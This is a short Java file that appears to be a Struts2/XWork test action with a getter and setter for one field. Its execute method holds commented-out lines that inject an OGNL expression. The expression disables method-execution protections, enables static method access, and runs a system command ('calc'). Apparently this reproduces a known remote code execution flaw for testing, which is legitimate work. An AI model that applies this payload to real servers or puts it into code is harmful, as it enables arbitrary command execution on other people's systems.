package org.test;

import com.opensymphony.xwork2.ActionContext;
import com.opensymphony.xwork2.ActionSupport;
import com.opensymphony.xwork2.util.ValueStack;

public class TestAction extends ActionSupport {

    private String foo;

    @Override
    public String execute() throws Exception {
        //ActionContext context = ActionContext.getContext();
        //ValueStack stack = context.getValueStack();
        //stack.setValue("foo", "(#context[\"xwork.MethodAccessor.denyMethodExecution\"]= new java.lang.Boolean(false), #_memberAccess[\"allowStaticMethodAccess\"]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('calc'))(meh)");
        //stack.setValue("(foo)('constant')", "true");
        return "success";
    }

    public String getFoo() {
        return foo;
    }

    public void setFoo(String foo) {
        this.foo = foo;
    }
}
